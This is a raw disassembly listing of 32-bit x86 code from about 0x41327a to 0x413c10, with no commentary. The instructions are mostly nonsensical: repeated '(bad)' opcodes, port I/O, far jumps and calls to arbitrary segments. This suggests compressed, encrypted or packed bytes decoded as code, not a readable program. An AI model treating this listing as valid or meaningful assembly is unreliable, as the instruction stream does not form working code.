  41327a:	push   0x71f19711
  41327f:	push   ds
  413280:	adc    bl,BYTE PTR [ecx-0x5ec54b07]
  413286:	in     eax,0xdc
  413288:	shl    DWORD PTR [ecx+0x5d],1
  41328b:	mov    bh,0xb5
  41328d:	xor    dl,bl
  41328f:	mov    cl,0x13
  413291:	lds    esi,FWORD PTR [edi-0x39]
  413294:	pusha  
  413295:	adc    BYTE PTR [edi-0x66],al
  413298:	adc    DWORD PTR [edx+edx*1],eax
  41329b:	sar    DWORD PTR gs:[edi],1
  41329e:	dec    eax
  41329f:	gs loope 0x413305
  4132a2:	dec    ebx
  4132a3:	sbb    al,0x89
  4132a5:	ins    BYTE PTR es:[edi],dx
  4132a6:	and    ah,BYTE PTR [esi+0x3cdee207]
  4132ac:	jecxz  0x413282
  4132ae:	adc    al,0x5
  4132b0:	in     eax,dx
  4132b1:	retf   0xbd8c
  4132b4:	sub    al,0x6
  4132b6:	js     0x413258
  4132b8:	mov    esi,0x6e07b9c
  4132bd:	dec    esi
  4132be:	jns    0x41329c
  4132c0:	leave  
  4132c1:	cmp    eax,0xc7b5a02f
  4132c6:	fs je  0x4132ef
  4132c9:	and    BYTE PTR [edi-0x5],dh
  4132cc:	rcr    DWORD PTR [ebp-0x7b],0x2d
  4132d0:	pop    edx
  4132d1:	add    BYTE PTR [esi+eiz*4+0x56],ch
  4132d5:	sar    BYTE PTR [edi],0x8f
  4132d8:	and    BYTE PTR [edx],bl
  4132da:	lods   al,BYTE PTR ds:[esi]
  4132db:	mov    edi,0x816a76e6
  4132e0:	scas   al,BYTE PTR es:[edi]
  4132e1:	adc    BYTE PTR [edi-0x2c],ah
  4132e4:	add    dh,BYTE PTR [edi]
  4132e6:	das    
  4132e7:	adc    al,0x58
  4132e9:	jmp    0x41335e
  4132eb:	stos   DWORD PTR es:[edi],eax
  4132ec:	push   edx
  4132ed:	aaa    
  4132ee:	icebp  
  4132ef:	sub    bl,BYTE PTR [ebx]
  4132f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132f2:	fwait
  4132f3:	outs   dx,DWORD PTR ds:[esi]
  4132f4:	pop    ds
  4132f5:	pop    ebx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	or     dh,bh
  4132f9:	push   eax
  4132fa:	mov    eax,ds:0x84d997cd
  4132ff:	jmp    0x4132bf
  413301:	test   al,cl
  413303:	add    DWORD PTR [ecx-0x20d13031],eax
  413309:	mov    bl,0xa2
  41330b:	(bad)  
  41330c:	sub    al,0x8f
  41330e:	shl    BYTE PTR [eax+0x26],0x1b
  413312:	sub    eax,0xb6a313d
  413317:	jmp    FWORD PTR [edi+edx*2]
  41331a:	or     DWORD PTR [esi],esi
  41331c:	or     DWORD PTR [esi-0x80],edi
  41331f:	and    edx,DWORD PTR [ecx]
  413321:	pop    edx
  413322:	sub    al,0xeb
  413324:	pop    ss
  413325:	or     BYTE PTR [ebp-0x6477450a],bl
  41332b:	pop    eax
  41332c:	retf   0xf521
  41332f:	out    dx,al
  413330:	call   0x5d39:0xd1e6f4e5
  413337:	adc    ebp,DWORD PTR [edi-0x3e]
  41333a:	pop    edi
  41333b:	loope  0x41330e
  41333d:	push   esi
  41333e:	ja     0x413381
  413340:	dec    edi
  413341:	shr    BYTE PTR [esi-0x62],0xe2
  413345:	in     al,0x3c
  413347:	sub    DWORD PTR [edi+eiz*1+0x1b],0xfffffff9
  41334c:	mov    esi,0xea1e63a6
  413351:	pop    DWORD PTR [edi]
  413353:	rcr    BYTE PTR [edx-0x111de8cb],cl
  413359:	in     eax,dx
  41335a:	pop    esi
  41335b:	je     0x4132fd
  41335d:	pop    ebp
  41335e:	push   0xd99a41b0
  413363:	pop    ss
  413364:	inc    edi
  413365:	and    ebx,DWORD PTR [edx]
  413367:	cmp    ebp,edx
  413369:	adc    edx,edi
  41336b:	mov    esp,0x75728401
  413370:	loope  0x41335a
  413372:	pusha  
  413373:	inc    edx
  413374:	repnz adc eax,0xd180f172
  41337a:	mov    edi,0x367faa43
  41337f:	imul   esi,DWORD PTR [eax+eax*2],0xffffffe8
  413383:	in     al,0xf4
  413385:	lods   eax,DWORD PTR ds:[esi]
  413386:	cmp    al,cl
  413388:	xor    eax,0x50fcab9a
  41338d:	out    dx,eax
  41338e:	mov    edi,0xa5ff5d81
  413393:	les    ebx,FWORD PTR ds:0x426811f7
  413399:	retf   
  41339a:	mov    ah,0xd2
  41339c:	mov    al,ds:0x7f313b22
  4133a1:	into   
  4133a2:	push   ecx
  4133a3:	push   0x2d
  4133a5:	mov    dl,0xce
  4133a7:	(bad)  
  4133a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a9:	sub    dh,BYTE PTR [ebx-0x3d]
  4133ac:	imul   eax,DWORD PTR [ebp-0x6826c2d6],0xe6523c23
  4133b6:	mov    es,esp
  4133b8:	sub    al,0x20
  4133ba:	mov    bh,0xea
  4133bc:	test   DWORD PTR [esi],0x5dd29363
  4133c2:	or     al,BYTE PTR [edi]
  4133c4:	fs popa 
  4133c6:	mov    edi,0xcc08872f
  4133cb:	xlat   BYTE PTR ds:[ebx]
  4133cc:	cmp    al,0x25
  4133ce:	in     al,dx
  4133cf:	scas   al,BYTE PTR es:[edi]
  4133d0:	pushf  
  4133d1:	cmc    
  4133d2:	test   eax,0x8a99794f
  4133d7:	sbb    al,0x95
  4133d9:	mov    ebp,0x830c6fd7
  4133de:	bound  ecx,QWORD PTR [esi-0x6bdfcc4]
  4133e4:	sub    DWORD PTR [ebp-0x63],edx
  4133e7:	and    eax,0xbcf80771
  4133ec:	dec    ebp
  4133ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ee:	loop   0x41341e
  4133f0:	mov    bh,0xa8
  4133f2:	pop    edx
  4133f3:	push   es
  4133f4:	scas   al,BYTE PTR es:[edi]
  4133f5:	pop    ebp
  4133f6:	out    0x75,eax
  4133f8:	dec    DWORD PTR [edx+0x44]
  4133fb:	nop
  4133fc:	push   es
  4133fd:	les    ebp,FWORD PTR [ecx]
  4133ff:	cmc    
  413400:	out    dx,al
  413401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413402:	shr    DWORD PTR [eax-0x71],1
  413405:	or     al,0xed
  413407:	cli    
  413408:	nop
  413409:	retf   
  41340a:	mov    bh,0x3b
  41340c:	sub    al,0xcf
  41340e:	jne    0x413438
  413410:	adc    esi,esp
  413412:	call   0x448f:0xedab880f
  413419:	push   es
  41341a:	retf   
  41341b:	and    BYTE PTR [edx],dl
  41341d:	add    eax,0xe220b4d8
  413422:	pop    ss
  413423:	test   ah,dl
  413425:	push   edx
  413426:	inc    ebx
  413427:	or     ecx,ebp
  413429:	fsubr  st,st(4)
  41342b:	fwait
  41342c:	pop    es
  41342d:	cmc    
  41342e:	sub    BYTE PTR [edx+0x64d94b05],al
  413434:	inc    ebp
  413435:	lods   al,BYTE PTR ds:[esi]
  413436:	or     al,0x70
  413438:	int3   
  413439:	sbb    dl,dl
  41343b:	jg     0x4134b0
  41343d:	jo     0x413483
  41343f:	jmp    0x41346e
  413441:	jo     0x413420
  413443:	lea    edx,[ebp+0x536bb08b]
  413449:	je     0x41341e
  41344b:	aaa    
  41344c:	mov    ah,BYTE PTR [esp+ecx*1+0x1b31022e]
  413453:	ffree  st(4)
  413455:	xchg   sp,ax
  413457:	fwait
  413458:	ret    0xafc7
  41345b:	mov    ebx,0x2d497f4c
  413460:	test   al,0xb2
  413462:	pop    eax
  413463:	aad    0xf3
  413465:	in     al,0xe2
  413467:	push   edi
  413468:	pop    esp
  413469:	mov    bl,0xa2
  41346b:	ins    BYTE PTR es:[edi],dx
  41346c:	mov    ax,0x8bc6
  413470:	ret    0x156e
  413473:	mov    ecx,0x8da5f755
  413478:	mov    al,0x86
  41347a:	test   eax,0xf9120fc6
  41347f:	cwde   
  413480:	push   es
  413481:	dec    edx
  413482:	sub    al,0x0
  413484:	add    ch,BYTE PTR [ebp+0x39b283c]
  41348a:	push   edx
  41348b:	pop    ecx
  41348c:	xchg   BYTE PTR [esi-0x31773ecb],al
  413492:	gs nop
  413494:	aas    
  413495:	fistp  WORD PTR [edx]
  413497:	cli    
  413498:	pop    ds
  413499:	std    
  41349a:	inc    esi
  41349b:	xchg   ecx,eax
  41349c:	bound  ebx,QWORD PTR [ecx+0x3cd928bb]
  4134a2:	jo     0x413440
  4134a4:	xor    bl,0xf7
  4134a7:	sbb    DWORD PTR [edx],eax
  4134a9:	clc    
  4134aa:	push   ds
  4134ab:	stos   DWORD PTR es:[edi],eax
  4134ac:	adc    dl,BYTE PTR [edx+0x50]
  4134af:	pop    edi
  4134b0:	(bad)  
  4134b1:	sbb    eax,0x9d5303c2
  4134b6:	pop    esp
  4134b7:	or     edi,esp
  4134b9:	test   eax,0xe2f48914
  4134be:	xchg   ebx,eax
  4134bf:	fcomp  DWORD PTR [edi-0x757bcf31]
  4134c5:	cmp    cl,ah
  4134c7:	sub    bp,WORD PTR [edi]
  4134ca:	shl    edi,cl
  4134cc:	mov    eax,0xd5f29fc6
  4134d1:	mov    WORD PTR [ebp-0x1f5b13ce],es
  4134d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134d8:	and    al,0x34
  4134da:	adc    bh,BYTE PTR [ebx]
  4134dc:	dec    ebx
  4134dd:	repz and DWORD PTR es:[ebp+ebx*1+0x315edfec],edx
  4134e6:	sub    cl,dh
  4134e8:	outs   dx,BYTE PTR ds:[esi]
  4134e9:	jb     0x413553
  4134eb:	push   ebx
  4134ec:	push   ss
  4134ed:	cmc    
  4134ee:	pop    edi
  4134ef:	ins    BYTE PTR es:[edi],dx
  4134f0:	call   DWORD PTR [esi+0x75]
  4134f3:	jp     0x4134cf
  4134f5:	call   0x258f24c7
  4134fa:	cmp    al,0x6f
  4134fc:	or     edi,DWORD PTR [esi+0x4363d189]
  413502:	or     ebp,DWORD PTR [edi+0x11]
  413505:	ins    BYTE PTR es:[edi],dx
  413506:	xor    DWORD PTR [eax+0x6b],ecx
  413509:	fdivr  DWORD PTR [ebp-0x46e70823]
  41350f:	jmp    0x4134cd
  413511:	xlat   BYTE PTR ds:[ebx]
  413512:	jp     0x41357f
  413514:	jmp    0xc359:0x2a81c9c1
  41351b:	mov    ebx,0xed4ec40a
  413520:	add    ecx,ebp
  413522:	add    eax,0xe2cb110f
  413527:	push   edx
  413528:	mov    bh,0x42
  41352a:	test   eax,0x68a2517a
  41352f:	std    
  413530:	xchg   DWORD PTR [edx+0x1b63214b],edx
  413536:	adc    al,0x4
  413538:	ss cli 
  41353a:	push   0x59ed80ca
  41353f:	jbe    0x4134d0
  413541:	xor    edi,DWORD PTR [eax-0x75706e56]
  413547:	xlat   BYTE PTR ds:[ebx]
  413548:	sbb    BYTE PTR gs:[edx],dh
  41354b:	jno    0x4135bc
  41354d:	dec    esp
  41354e:	jns    0x413504
  413550:	cmp    edx,eax
  413552:	mov    ebp,0x65129627
  413557:	out    dx,al
  413558:	jmp    0xe7950c31
  41355d:	hlt    
  41355e:	out    0xc9,eax
  413560:	jmp    0x81e4d9b1
  413565:	bound  eax,QWORD PTR [edx+eax*1]
  413568:	xor    BYTE PTR [edi+0xc3cacfd],al
  41356e:	mov    eax,0xf5eb5b0e
  413573:	iret   
  413574:	inc    edx
  413575:	cmp    bh,bl
  413577:	lods   al,BYTE PTR ds:[esi]
  413578:	mov    eax,0x28505891
  41357d:	and    eax,DWORD PTR [esi-0x6954ca51]
  413583:	pop    esi
  413584:	push   es
  413585:	mov    dh,0xc0
  413587:	loopne 0x41358f
  413589:	mov    esi,DWORD PTR [ebx-0x2036bbaa]
  41358f:	or     ah,BYTE PTR [eax-0x54]
  413592:	inc    edi
  413593:	fisttp WORD PTR [eax]
  413595:	xor    al,0x3
  413597:	jle    0x4135b5
  413599:	add    bl,BYTE PTR [eax]
  41359b:	sar    DWORD PTR fs:[ebp-0x55],cl
  41359f:	mov    ds:0x3920f0ee,eax
  4135a4:	test   al,0xcf
  4135a6:	stos   BYTE PTR es:[edi],al
  4135a7:	repnz mov edi,0xdaffc439
  4135ad:	pop    ebp
  4135ae:	or     al,BYTE PTR [eax+0x45]
  4135b1:	jnp    0x413604
  4135b3:	psadbw mm7,QWORD PTR [ecx-0x5c]
  4135b7:	das    
  4135b8:	test   eax,0xfd49a1e2
  4135bd:	iret   
  4135be:	mov    dl,0x26
  4135c0:	(bad)  
  4135c1:	sub    cl,BYTE PTR [edx+0x5d257f01]
  4135c7:	xor    BYTE PTR [edi],bl
  4135c9:	stos   DWORD PTR es:[edi],eax
  4135ca:	or     edi,edx
  4135cc:	push   eax
  4135cd:	push   esp
  4135ce:	sub    esi,eax
  4135d0:	push   ecx
  4135d1:	lods   al,BYTE PTR ds:[esi]
  4135d2:	add    al,0xdb
  4135d4:	jg     0x4135d3
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	inc    ecx
  4135d8:	fisttp WORD PTR [esi-0x597367b8]
  4135de:	in     al,dx
  4135df:	(bad)  
  4135e0:	adc    bh,BYTE PTR [edx+0x32]
  4135e3:	xor    al,ch
  4135e5:	stos   DWORD PTR es:[edi],eax
  4135e6:	ds dec esp
  4135e8:	inc    edi
  4135e9:	adc    DWORD PTR [edx],0x4b
  4135ec:	mov    cl,0x31
  4135ee:	(bad)  
  4135ef:	sti    
  4135f0:	or     al,0xd8
  4135f2:	out    dx,al
  4135f3:	loop   0x41358e
  4135f5:	call   DWORD PTR [eax+0x625cf078]
  4135fb:	inc    edi
  4135fc:	xchg   ebp,eax
  4135fd:	xor    al,0xe5
  4135ff:	enter  0xb312,0x4f
  413603:	fistp  WORD PTR [ebx]
  413605:	mov    edx,0x46fc099f
  41360a:	and    BYTE PTR [esi+eax*8-0x3a],bh
  41360e:	icebp  
  41360f:	icebp  
  413610:	mov    DWORD PTR [ebx-0x624ae9c3],esp
  413616:	add    ah,BYTE PTR [ecx-0x4e]
  413619:	fwait
  41361a:	aam    0x88
  41361c:	mov    ebx,0xa3b4a6e2
  413621:	call   DWORD PTR [eax+0x4a959ddb]
  413627:	push   esi
  413628:	loop   0x41365f
	...
  41380a:	jecxz  0x41382b
  41380c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41380d:	adc    al,0xfe
  41380f:	mov    ebp,0x9faffff3
  413814:	test   ah,0xd1
  413817:	(bad)  
  413818:	cmp    al,0x3f
  41381a:	sbb    DWORD PTR [edi],esi
  41381c:	add    DWORD PTR [eax],eax
  41381e:	and    al,BYTE PTR [edi]
  413820:	add    BYTE PTR [eax],al
  413822:	jmp    0x903d:0x9c092cc8
  413829:	les    ebp,FWORD PTR [edi+esi*2-0x80]
  41382d:	dec    esp
  41382e:	push   esi
  41382f:	or     al,BYTE PTR [eax-0x16ec7b8]
  413835:	jp     0x41382e
  413837:	addr16 sahf 
  413839:	aas    
  41383a:	jo     0x413827
  41383c:	cwde   
  41383d:	ror    DWORD PTR [edx-0x73],cl
  413840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413841:	test   DWORD PTR [ebp-0x159de7f9],ebp
  413847:	(bad)  
  413848:	xchg   ecx,eax
  413849:	imul   ebp,ecx,0x53
  41384c:	jle    0x41381f
  41384e:	or     edi,DWORD PTR [ecx]
  413850:	mov    edx,0xea7ef672
  413855:	es jnp 0x413836
  413858:	and    al,BYTE PTR [eax+0x5f5b9f9d]
  41385e:	(bad)  
  41385f:	nop
  413860:	loop   0x413856
  413862:	dec    edi
  413863:	inc    esp
  413864:	pop    ebx
  413865:	mov    dl,0x5
  413867:	or     dh,dl
  413869:	mov    dl,0xdc
  41386b:	mov    dh,BYTE PTR [edx]
  41386d:	dec    edi
  41386e:	pop    ss
  41386f:	clc    
  413870:	test   BYTE PTR [esi],0xd4
  413873:	pop    es
  413874:	and    edx,0x7f315ba2
  41387a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41387b:	push   0xc478be5f
  413880:	mov    dl,0x71
  413882:	jge    0x413804
  413884:	data16 daa 
  413886:	popa   
  413887:	sbb    bl,ch
  413889:	xchg   ebp,eax
  41388a:	mov    ebx,0x4d8b5ed3
  41388f:	in     eax,0x22
  413891:	cld    
  413892:	ins    DWORD PTR es:[edi],dx
  413893:	enter  0xa745,0xe4
  413897:	call   0x55ecb8d8
  41389c:	adc    eax,0xa5928dda
  4138a1:	jge    0x413885
  4138a3:	loop   0x4138f0
  4138a5:	xor    bh,BYTE PTR [ebx+0x273b263c]
  4138ab:	in     eax,dx
  4138ac:	sti    
  4138ad:	outs   dx,DWORD PTR ds:[esi]
  4138ae:	test   BYTE PTR [ecx+0x15acae0e],ah
  4138b4:	sbb    eax,0x1445cfc7
  4138b9:	pop    eax
  4138ba:	jecxz  0x41390d
  4138bc:	add    ebx,ecx
  4138be:	neg    BYTE PTR [eax]
  4138c0:	jge    0x413852
  4138c2:	(bad)  
  4138c3:	aad    0x6c
  4138c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c6:	inc    ebp
  4138c7:	call   0xb2c4:0xbf689fcd
  4138ce:	pop    esi
  4138cf:	sub    DWORD PTR [edx+0x7d],esi
  4138d2:	add    ebx,DWORD PTR [esi-0x3f]
  4138d5:	dec    ecx
  4138d6:	stc    
  4138d7:	dec    esi
  4138d8:	test   al,bh
  4138da:	call   0xe053:0x930cc5d9
  4138e1:	lds    eax,FWORD PTR [ebx+0x63]
  4138e4:	nop
  4138e5:	stos   DWORD PTR es:[edi],eax
  4138e6:	inc    esi
  4138e7:	push   0xfe8c27d4
  4138ec:	(bad)  [edi]
  4138ee:	jl     0x4138ff
  4138f0:	jmp    0xe6a4:0x1c44ba40
  4138f7:	ds (bad) 
  4138f9:	jb     0x41394b
  4138fb:	in     eax,dx
  4138fc:	sbb    al,0x61
  4138fe:	jno    0x413924
  413900:	push   edi
  413901:	sar    DWORD PTR [eax+0x3f],0x23
  413905:	xchg   BYTE PTR [eax-0x10],bl
  413908:	inc    ebx
  413909:	outs   dx,DWORD PTR ds:[esi]
  41390a:	ret    0xa5f9
  41390d:	mov    esi,0xed7cd37b
  413912:	cmp    eax,0x9c6e120f
  413917:	or     esp,esp
  413919:	enter  0xa448,0x64
  41391d:	test   eax,0xd4eb5f
  413922:	or     DWORD PTR [eax-0x43ab7e3c],ebp
  413928:	call   0x35f2:0x69b720a2
  41392f:	(bad)  
  413930:	mov    esi,0x81624863
  413935:	pop    ds
  413936:	xor    dl,BYTE PTR [eax+0x33]
  413939:	in     al,0x4b
  41393b:	pop    ds
  41393c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41393d:	mov    ah,0x3
  41393f:	mov    ah,0x78
  413941:	popa   
  413942:	leave  
  413943:	outs   dx,DWORD PTR ds:[esi]
  413944:	cmp    eax,0xf4971981
  413949:	fdivr  st,st(2)
  41394b:	mov    edi,0xdf8afdc6
  413950:	in     eax,0x8c
  413952:	ret    0xbae4
  413955:	cwde   
  413956:	sbb    eax,0xf5ddf3a7
  41395b:	adc    BYTE PTR [eax+edx*8-0x19a8651a],bl
  413962:	fmulp  st(6),st
  413964:	aam    0xd4
  413966:	fdiv   QWORD PTR [esi]
  413968:	pop    edi
  413969:	sub    DWORD PTR [ebp-0x66],eax
  41396c:	mov    ebp,esp
  41396e:	fsubr  QWORD PTR [ebp+0x31]
  413971:	pop    ecx
  413972:	push   edi
  413973:	scas   eax,DWORD PTR es:[edi]
  413974:	jg     0x41391f
  413976:	in     al,0x9b
  413978:	mov    bh,0x6f
  41397a:	sbb    BYTE PTR [esi+0x992bb30],bh
  413980:	sbb    DWORD PTR [ebp+0x33],ebx
  413983:	div    BYTE PTR [esi]
  413985:	adc    al,0x7a
  413987:	adc    BYTE PTR [edi+0x57],dh
  41398a:	jbe    0x413935
  41398c:	and    bl,dh
  41398e:	in     al,dx
  41398f:	(bad)  
  413990:	jmp    DWORD PTR [ebx]
  413992:	test   eax,0x990566d2
  413997:	jle    0x4139e2
  413999:	sbb    al,0x12
  41399b:	inc    ebp
  41399c:	add    ebx,DWORD PTR [eax-0x528d8cd8]
  4139a2:	shl    DWORD PTR [ebx+0x53],0x9b
  4139a6:	nop
  4139a7:	sbb    al,0xd5
  4139a9:	aaa    
  4139aa:	or     DWORD PTR [edx+0x2a5f46f7],edi
  4139b0:	jbe    0x413932
  4139b2:	jb     0x4139a2
  4139b4:	(bad)  
  4139b6:	sbb    DWORD PTR [ebp-0x60],ecx
  4139b9:	inc    esi
  4139ba:	jns    0x4139bb
  4139bc:	enter  0xa0b4,0xd0
  4139c0:	or     bl,BYTE PTR [ecx-0x54b0157]
  4139c6:	dec    eax
  4139c7:	jae    0x413985
  4139c9:	hlt    
  4139ca:	int3   
  4139cb:	pop    ds
  4139cc:	fwait
  4139cd:	cld    
  4139ce:	sbb    al,0x59
  4139d0:	xchg   ebx,eax
  4139d1:	dec    edx
  4139d2:	mov    dl,0xb3
  4139d4:	or     BYTE PTR ds:0xb1174339,cl
  4139da:	push   ss
  4139db:	push   ebx
  4139dc:	scas   eax,DWORD PTR es:[edi]
  4139dd:	(bad)  
  4139de:	outs   dx,BYTE PTR ds:[esi]
  4139df:	sbb    DWORD PTR ds:0x6fcff9eb,esi
  4139e5:	dec    ecx
  4139e6:	out    0xa5,eax
  4139e8:	pop    ds
  4139e9:	or     al,0x12
  4139eb:	scas   al,BYTE PTR es:[edi]
  4139ec:	(bad)  [eax+0x1b]
  4139ef:	gs stos DWORD PTR es:[edi],eax
  4139f1:	add    dl,ch
  4139f3:	jl     0x413a64
  4139f5:	dec    ecx
  4139f6:	inc    esp
  4139f7:	in     eax,dx
  4139f8:	ror    BYTE PTR [ebx-0x6625bde8],1
  4139fe:	lahf   
  4139ff:	cli    
  413a00:	adc    bh,0xb0
  413a03:	mov    edx,0xe96f3fae
  413a08:	inc    edx
  413a09:	inc    edi
  413a0a:	pop    ebp
  413a0b:	test   al,0x72
  413a0d:	pop    es
  413a0e:	jns    0x4139ef
  413a10:	std    
  413a11:	mov    al,ds:0xde197d07
  413a16:	(bad)  [edx]
  413a18:	mov    ch,BYTE PTR [esi]
  413a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1b:	fnsave [edx+eiz*1]
  413a1e:	sub    al,0xa0
  413a20:	je     0x413a40
  413a22:	pop    DWORD PTR [ecx+0x13]
  413a25:	push   edi
  413a26:	ss loopne 0x413a44
  413a29:	jmp    0xde3e9fd8
  413a2e:	inc    ebp
  413a2f:	adc    edi,DWORD PTR [edi+0xe23ff10]
  413a35:	jecxz  0x413ab2
  413a37:	bound  ecx,QWORD PTR [ecx]
  413a39:	stos   DWORD PTR es:[edi],eax
  413a3a:	loope  0x413a7c
  413a3c:	mov    ds:0x50e7385d,al
  413a41:	pop    eax
  413a42:	and    DWORD PTR [esi-0x64fbb131],ecx
  413a48:	jg     0x413a5d
  413a4a:	shl    BYTE PTR [ebx],cl
  413a4c:	fiadd  DWORD PTR [esi-0x6]
  413a4f:	repnz mov ebx,DWORD PTR [edi]
  413a52:	div    ebx
  413a54:	ror    DWORD PTR [ecx+esi*2-0x645ecd85],0x7a
  413a5c:	mov    edi,ecx
  413a5e:	xchg   ebx,eax
  413a5f:	sbb    esi,DWORD PTR [eax-0x6c19b6e0]
  413a65:	push   0x2b63f972
  413a6a:	loopne 0x413a60
  413a6c:	sbb    al,0x39
  413a6e:	lods   al,BYTE PTR ds:[esi]
  413a6f:	icebp  
  413a70:	sub    DWORD PTR [edi-0x6a],esp
  413a73:	clc    
  413a74:	push   0x69
  413a76:	push   ss
  413a77:	loope  0x413ac4
  413a79:	aam    0x55
  413a7b:	jno    0x413aec
  413a7d:	sbb    DWORD PTR [ecx+esi*4-0x28ca5f95],edx
  413a84:	sti    
  413a85:	mov    bl,0x9c
  413a87:	and    ebx,ebx
  413a89:	(bad)  
  413a8a:	sub    al,0x17
  413a8c:	pop    ds
  413a8d:	jecxz  0x413aa7
  413a8f:	test   BYTE PTR [esi],cl
  413a91:	sub    al,0x8e
  413a93:	out    dx,eax
  413a94:	pop    ebp
  413a95:	mov    al,0x55
  413a98:	mov    ds:0x54a5371d,al
  413a9d:	sbb    DWORD PTR [ebx+0x59b89b64],0x6e
  413aa4:	jo     0x413aad
  413aa6:	cmp    DWORD PTR [esi],edi
  413aa8:	pop    ebp
  413aa9:	push   ebp
  413aaa:	cmp    eax,0xd9e9ed78
  413aaf:	or     al,0x45
  413ab1:	sbb    ecx,DWORD PTR [edi-0x3991186f]
  413ab7:	add    al,0xbb
  413ab9:	(bad)  
  413aba:	stos   DWORD PTR es:[edi],eax
  413abb:	and    ebp,DWORD PTR [ecx]
  413abd:	xchg   esp,ebx
  413abf:	fistp  WORD PTR [ebx+0x1]
  413ac2:	(bad)  
  413ac3:	lods   al,BYTE PTR ds:[esi]
  413ac4:	inc    edx
  413ac5:	mov    ebp,0x6c749ff7
  413aca:	sbb    al,0x70
  413acc:	ins    BYTE PTR es:[edi],dx
  413acd:	sahf   
  413ace:	test   al,0x6
  413ad0:	xor    ebp,DWORD PTR [ebx-0x58]
  413ad3:	dec    ebp
  413ad4:	adc    ebp,DWORD PTR [eax]
  413ad6:	pop    esi
  413ad7:	push   cs
  413ad8:	or     BYTE PTR [edx],dh
  413ada:	inc    ebp
  413adb:	push   ecx
  413adc:	mov    ebp,0x94ece9df
  413ae1:	lods   eax,DWORD PTR ds:[esi]
  413ae2:	sbb    DWORD PTR [esi],ebp
  413ae4:	fist   WORD PTR [ebp-0x80]
  413ae7:	mov    edx,0xfb9dac41
  413aec:	es adc eax,ebp
  413aef:	cmp    edx,DWORD PTR [edi+0x3b86bcb0]
  413af5:	shr    BYTE PTR [eax+edi*1],cl
  413af8:	cmp    al,0x79
  413afa:	fisubr DWORD PTR [eax-0x5cb4a85c]
  413b00:	in     al,dx
  413b01:	inc    edi
  413b02:	mov    edx,0x5a91d600
  413b07:	xchg   DWORD PTR [edi+0x41],eax
  413b0a:	outs   dx,DWORD PTR ds:[esi]
  413b0b:	inc    edx
  413b0c:	pop    es
  413b0d:	mov    WORD PTR [ecx*2+0x34602aea],es
  413b14:	je     0x413b4f
  413b16:	push   cs
  413b17:	sbb    DWORD PTR [eax+0x7c],0x612c9d3c
  413b1e:	fistp  DWORD PTR [edi]
  413b20:	cmp    ah,BYTE PTR [ebx-0x2c]
  413b23:	mov    edx,0xa46a3eb4
  413b28:	xchg   ebx,eax
  413b29:	xchg   esp,eax
  413b2a:	test   DWORD PTR [edx-0x6c],ebx
  413b2d:	jmp    0xd5e9:0xfd819f0d
  413b34:	call   0x4c9a:0x28533b08
  413b3b:	xor    al,0xf2
  413b3d:	mov    al,BYTE PTR [edi+0x3e]
  413b40:	push   ebp
  413b41:	jnp    0x413b25
  413b43:	xchg   BYTE PTR [edx],bh
  413b45:	jnp    0x413bc5
  413b47:	jle    0x413b2a
  413b49:	lods   eax,DWORD PTR ds:[esi]
  413b4a:	push   ebp
  413b4b:	stos   BYTE PTR es:[edi],al
  413b4c:	mov    bl,0xb4
  413b4e:	fcomi  st,st(7)
  413b50:	jle    0x413b56
  413b52:	pop    ecx
  413b53:	dec    ecx
  413b54:	add    eax,0xdd058173
  413b59:	out    dx,eax
  413b5a:	aaa    
  413b5b:	ficomp DWORD PTR [edx]
  413b5d:	or     dh,BYTE PTR [edx-0x1d]
  413b60:	ds (bad) 
  413b62:	jns    0x413b84
  413b64:	fwait
  413b65:	adc    BYTE PTR [edx+edx*4],bl
  413b68:	adc    al,0x39
  413b6a:	fld    DWORD PTR ds:0x3d1b2fb5
  413b70:	xlat   BYTE PTR ds:[bx]
  413b72:	mov    ds:0x58b9c4ae,al
  413b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b78:	sub    DWORD PTR gs:[ebp-0x5e],0xd38b269a
  413b80:	sub    ecx,0xffffff81
  413b83:	pop    ss
  413b84:	test   BYTE PTR [ecx+0x16],bl
  413b87:	pushf  
  413b88:	sub    ebx,ebx
  413b8a:	les    ebx,FWORD PTR [esi+0x62]
  413b8d:	mov    ds:0xdc1a29b3,al
  413b92:	jmp    0x1acf15a8
  413b97:	out    dx,eax
  413b98:	(bad)  
  413b99:	pusha  
  413b9a:	sub    eax,0xd7f6d7aa
  413b9f:	call   0x1b0c0558
  413ba4:	jns    0x413b8f
  413ba6:	imul   esp,DWORD PTR [ecx+esi*2-0x3bba7a43],0xb84c0c4c
  413bb1:	mov    dl,0xe
  413bb3:	cmp    al,0xc8
  413bb5:	aaa    
  413bb6:	mov    fs,WORD PTR [edi+0x64d0c9e5]
  413bbc:	popa   
  413bbd:	test   DWORD PTR [eax*1-0x5d5d5ff0],0xe665af59
  413bc8:	das    
  413bc9:	es ret 0xfa3e
  413bcd:	or     eax,0xb892e9db
  413bd2:	repz ror DWORD PTR [ebp+0x5],cl
  413bd6:	cmp    BYTE PTR [edi+0x2d6e8e93],al
  413bdc:	loop   0x413c37
  413bde:	aas    
  413bdf:	out    dx,eax
  413be0:	rcr    DWORD PTR [ebp+0x28],0x2
  413be4:	repz add ah,BYTE PTR [ecx-0x3ecb284b]
  413beb:	jmp    DWORD PTR [ebp+0x4f]
  413bee:	jecxz  0x413b78
  413bf0:	sub    eax,0xdcb3555b
  413bf5:	add    DWORD PTR [edi-0x24abc80a],ebx
  413bfb:	xchg   esp,eax
  413bfc:	clc    
  413bfd:	inc    cl
  413bff:	dec    eax
  413c00:	sahf   
  413c01:	and    ebx,ebp
  413c03:	sbb    al,0x16
  413c05:	enter  0xdeab,0xaf
  413c09:	ja     0x413b94
  413c0b:	popa   
  413c0c:	sti    
  413c0d:	in     eax,0xd4
  413c0f:	(bad)  
  413c10:	fsubr  QWORD PTR [edi]
